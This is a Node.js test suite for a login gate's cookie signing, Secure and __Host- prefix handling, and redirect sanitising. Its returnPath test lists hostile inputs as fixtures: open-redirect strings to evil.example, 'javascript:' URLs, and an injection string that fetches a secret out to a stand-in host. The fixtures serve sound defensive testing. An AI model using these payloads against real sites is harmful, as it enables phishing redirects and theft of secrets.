import assert from 'node:assert/strict';
import test from 'node:test';

import { createGate } from '../server/gate.js';

const request = (headers = {}) => ({ headers });

test('no secret is an open host, and it says so', () => {
  const gate = createGate({ secret: null });
  assert.equal(gate.open, true);
  assert.equal(gate.allows(request()), true);
});

test('a closed host refuses a request with nothing on it', () => {
  const gate = createGate({ secret: 'hunter2' });
  assert.equal(gate.open, false);
  assert.equal(gate.allows(request()), false);
  assert.equal(gate.allows(request({ cookie: 'marble_drive=nonsense' })), false);
});

test('the secret is exchanged for a cookie, and the cookie is accepted', () => {
  const gate = createGate({ secret: 'hunter2' });
  assert.equal(gate.accepts('wrong'), false);
  assert.equal(gate.accepts('hunter2'), true);

  const header = gate.cookieHeader();
  assert.match(header, /^marble_drive=[^;]+; Path=\/; HttpOnly; SameSite=Lax/);
  const token = header.slice('marble_drive='.length, header.indexOf(';'));
  assert.equal(gate.allows(request({ cookie: `marble_drive=${token}` })), true);
});

test('a cookie signed with a different secret is not a cookie', () => {
  const mine = createGate({ secret: 'hunter2' });
  const theirs = createGate({ secret: 'something-else' });
  const token = theirs.issue();
  assert.equal(mine.valid(token), false);
});

test('an expired cookie is refused', () => {
  const gate = createGate({ secret: 'hunter2', days: -1 });
  assert.equal(gate.valid(gate.issue()), false);
});

test('a tampered payload is refused, signature and all', () => {
  const gate = createGate({ secret: 'hunter2' });
  const token = gate.issue();
  const [payload, signature] = token.split('.');
  assert.equal(gate.valid(`${Number(payload) + 1e9}.${signature}`), false);
  assert.equal(gate.valid(`${payload}.`), false);
  assert.equal(gate.valid(payload), false);
});

test('the same secret as a bearer token, for a script', () => {
  const gate = createGate({ secret: 'hunter2' });
  assert.equal(gate.allows(request({ authorization: 'Bearer hunter2' })), true);
  assert.equal(gate.allows(request({ authorization: 'Bearer nope' })), false);
});

test('Secure is set only when it was asked for', () => {
  assert.ok(!createGate({ secret: 'x' }).cookieHeader().includes('Secure'));
  assert.ok(createGate({ secret: 'x', secure: true }).cookieHeader().includes('Secure'));
});

// A request as Node hands it over: the peer is on the socket, not in a header.
const arriving = (remoteAddress, headers = {}) => ({ headers, socket: { remoteAddress } });

test('Secure follows the request when it came through a local HTTPS proxy', () => {
  const gate = createGate({ secret: 'x' });
  // Tailscale Serve terminates TLS and forwards to loopback, saying so.
  for (const peer of ['127.0.0.1', '::1', '::ffff:127.0.0.1']) {
    const req = arriving(peer, { 'x-forwarded-proto': 'https' });
    assert.ok(gate.cookieHeader(req).includes('; Secure'), peer);
    assert.ok(gate.clearHeader(req).includes('; Secure'), peer);
  }
  // Plain http://localhost keeps working, in Safari too, which drops a Secure
  // cookie over http even on localhost.
  assert.ok(!gate.cookieHeader(arriving('127.0.0.1')).includes('Secure'));
});

test('a forwarded-proto header from anywhere but loopback is not believed', () => {
  const gate = createGate({ secret: 'x' });
  const req = arriving('192.168.1.20', { 'x-forwarded-proto': 'https' });
  assert.ok(!gate.cookieHeader(req).includes('Secure'));
});

test('asking for Secure still means always', () => {
  const gate = createGate({ secret: 'x', secure: true });
  assert.ok(gate.cookieHeader(arriving('127.0.0.1')).includes('; Secure'));
});

test('where the gate sends you after signing in is a path on this host, or /', async () => {
  const { returnPath } = await import('../server/gate.js');
  const home = [
    undefined, null, '', 'a/drive', '//evil.example', '//evil.example/x', '/\\evil.example', '/\\/evil.example',
    'javascript:alert(1)', 'JavaScript:alert(1)', ' /a', 'https://evil.example/', '/\t/evil.example', '/\n/evil.example',
    "');fetch('https://x/?'+this.secret.value);('", '/a\u0000b', '/a\u007fb',
  ];
  // Dot segments the parser removes can leave a leading // behind.
  home.push(
    '/.//evil.example', '/./\\evil.example', '/.\\/evil.example', '/a/..//evil.example', '/..//evil.example',
    '/%2e//evil.example', '/%2E%2E//evil.example', '/a/../\\evil.example', '/././/evil',
  );
  for (const to of home) assert.equal(returnPath(to), '/', JSON.stringify(to));
  assert.equal(returnPath('/a/drive?x=1'), '/a/drive?x=1');
  assert.equal(returnPath('/a/My%20Notes#top'), '/a/My%20Notes#top');
  assert.equal(returnPath('/'), '/');
});

// The passphrase cookie is __Host- over https, so another drive under
// marbledrive.app can't plant one for this drive (server/gate.js).
const withCookie = (req, cookie) => ({ ...req, headers: { ...req.headers, cookie } });

test('over https the cookie is __Host-: Secure, Path=/ and no Domain, and only that name counts there', () => {
  const gate = createGate({ secret: 'x' });
  const https = arriving('127.0.0.1', { 'x-forwarded-proto': 'https' });
  const header = gate.cookieHeader(https);
  assert.match(header, /^__Host-marble_drive=[^;]+; Path=\/; HttpOnly; SameSite=Lax; Max-Age=\d+; Secure$/);
  assert.doesNotMatch(header, /Domain=/i);
  const token = header.slice('__Host-marble_drive='.length, header.indexOf(';'));
  assert.equal(gate.allows(withCookie(https, `__Host-marble_drive=${token}`)), true);
  assert.equal(gate.allows(withCookie(https, `marble_drive=${token}`)), false, 'a plain one, planted or old, is not read over https');
  assert.equal(gate.allows(withCookie(https, `marble_drive=${token}; __Host-marble_drive=junk`)), false);
  assert.equal(gate.cookieNameFor(https), '__Host-marble_drive');
  assert.equal(gate.clearHeader(https), '__Host-marble_drive=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0; Secure');
});

test('plain http keeps the plain name, and a __Host- one is not read there', () => {
  const gate = createGate({ secret: 'x' });
  const desk = arriving('127.0.0.1');
  const header = gate.cookieHeader(desk);
  assert.match(header, /^marble_drive=[^;]+; Path=\/; HttpOnly; SameSite=Lax; Max-Age=\d+$/);
  const token = header.slice('marble_drive='.length, header.indexOf(';'));
  assert.equal(gate.allows(withCookie(desk, `marble_drive=${token}`)), true);
  assert.equal(gate.allows(withCookie(desk, `__Host-marble_drive=${token}`)), false);
  assert.equal(gate.cookieNameFor(desk), 'marble_drive');
  assert.equal(gate.clearHeader(desk), 'marble_drive=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
  assert.equal(gate.cookieNameFor(arriving('192.168.1.20', { 'x-forwarded-proto': 'https' })), 'marble_drive', 'a forwarded-proto from elsewhere is not believed');
});

test('a host told it is always https: __Host- through a proxy or the edge, the plain name for a request made on the machine itself', () => {
  const gate = createGate({ secret: 'x', secure: true });
  for (const req of [
    arriving('172.16.0.2', { 'x-forwarded-for': '203.0.113.9', 'x-forwarded-proto': 'https' }),
    arriving('127.0.0.1', { 'x-forwarded-host': 'ana.marbledrive.app', 'x-forwarded-proto': 'https' }),
    arriving('127.0.0.1', { 'cf-ray': '8c1234567890-SJC' }),
  ]) {
    assert.equal(gate.cookieNameFor(req), '__Host-marble_drive');
    assert.match(gate.cookieHeader(req), /^__Host-marble_drive=.*; Secure$/);
  }
  // The agent's browser opens the drive at http://127.0.0.1 with the pass
  // planted under the plain name (server/agent/browser.js).
  const agentBrowser = arriving('127.0.0.1');
  assert.equal(gate.cookieNameFor(agentBrowser), 'marble_drive');
  assert.equal(gate.allows(withCookie(agentBrowser, `${gate.cookieName}=${gate.issue(60_000)}`)), true);
});

test('a cookie name that already has the prefix is not given it twice', () => {
  const gate = createGate({ secret: 'x', cookieName: '__Host-mine' });
  assert.equal(gate.cookieNameFor(arriving('127.0.0.1', { 'x-forwarded-proto': 'https' })), '__Host-mine');
});
